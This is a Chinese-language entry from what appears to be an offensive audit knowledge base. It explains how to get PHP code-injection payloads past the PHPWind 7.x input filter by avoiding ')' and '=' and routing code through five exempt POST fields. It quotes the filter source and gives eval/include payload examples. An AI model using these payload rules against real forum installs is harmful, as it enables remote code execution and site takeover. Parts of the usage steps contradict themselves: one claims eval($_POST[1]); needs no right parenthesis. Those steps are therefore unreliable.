# PHPWind 7.x 入参清洗边界与 5 个 POST 豁免字段（payload 构造必须遵守）

- **code**: phpwind-7.x-入参清洗边界与-5-个-post-豁免字段-payload-构造必须遵守
- **kind**: script
- **category**: app-audit
- **component**: PHPWind 7.x global.php / require/common.php
- **severity**: high
- **language**: php
- **source**: self
- **verified_note**: 源码逐行确认（7.5 SP3）。该结论对 7.3.2 的适用性需以目标实际响应验证（7.3.2 的 global.php 是否已有同段 CheckVar 未知）。
- **path**: pocs/phpwind-7.x-入参清洗边界与-5-个-post-豁免字段-payload-构造必须遵守/poc.php
- **tags**: phpwind,参数清洗,CheckVar,Char_cv,payload构造约束
- **created_at**: 2026-10-06T11:37:29.041Z

## 描述

PHPWind 7.x 全局入参清洗的真实边界，直接决定 payload 怎么写。global.php:53-61 对 $_POST 逐键调用 CheckVar，但 atc_content / atc_title / prosign / pwuser / pwpwd 这 5 个键名被显式豁免；$_GET 则无豁免全量清洗。CheckVar（require/common.php:667-679）把 ) → &#41;、= → &#61;、< → &#60;、.. → &#46;&#46;，左括号 ( 不转义。Char_cv（646-666）把 " ' < > 转成 HTML 实体并折叠制表符/双空格。结论：payload 里不能出现右括号与等号，除非把内容放进上述 5 个 POST 白名单字段；$ { } ( [ ] ; . / : _ @ 全部可通过。

## 用法

```
构造任何 PHP payload 时：
1) 优先避开右括号：用 include$_POST[0]; / echo 1; / eval($_POST[1]); 这类不需要 ) 的写法（include 不带括号合法）。
2) 必须带括号时，把代码体放进 POST 的 atc_content / atc_title / prosign / pwuser / pwpwd 之一。
   例：
     GET  /bbs/<任意写入点>&a=eval($_POST[atc_content]);
     POST atc_content=phpinfo();        ← 这一层不会再被 CheckVar，括号保留
   注意此时 a 的值里带 ) 会被转义 → 应改为 eval($_POST[pwuser]) 仍带 ) 不行；
   实际可行版：GET 参数 a 只放无括号骨架，代码体走白名单字段。
3) 字符串常量避免引号：' 与 " 都会被实体化，改用 heredoc 不可行 → 用 $_POST[x] 传字符串。
```

## 正文

```
// global.php:53-61  —— 所有前台请求必经
foreach ($_POST as $_key => $_value) {
	if (!in_array($_key,array('atc_content','atc_title','prosign','pwuser','pwpwd'))) {
		CheckVar($_POST[$_key]);
	}
}
foreach ($_GET as $_key => $_value) {
	CheckVar($_GET[$_key]);        // GET 无豁免，全量
}

// require/common.php:667-679
function CheckVar(&$var) {
	if (is_array($var)) {
		foreach ($var as $key => $value) { CheckVar($var[$key]); }
	} elseif (P_W != 'admincp') {
		$var = str_replace(array('..',')','<','='),array('&#46;&#46;','&#41;','&#60;','&#61;'),$var);
	} elseif (str_replace(array('<iframe','<meta','<script'),'',$var)!=$var) {
		global $basename; $basename = 'javascript:history.go(-1);'; adminmsg('word_error');
	}
}
// 注意：只转义右括号 ) 与 = < ..，左括号 ( 保留。

// require/common.php:646-666  Char_cv（InitGP 默认 cvtype=1 会调用）
'"'    → &quot;
"'"    → &#39;
"<"    → &lt;      ("%3C" 同样)
">"    → &gt;      ("%3E" 同样)
"\t"   → 4 空格 ; 连续两个空格 → &nbsp;&nbsp;
去掉 \0 %00 \r 与控制字符；$istrim=true 时先 trim
// 保留：$ { } ( [ ] ; . / : _ @ 以及全部 ASCII 字母数字

// global.php:40-51 URL 重写模式（$_GET = $_NGET）发生在 CheckVar 之前，
// 所以重写出来的参数同样会被 CheckVar 处理，无法借此绕过。
```
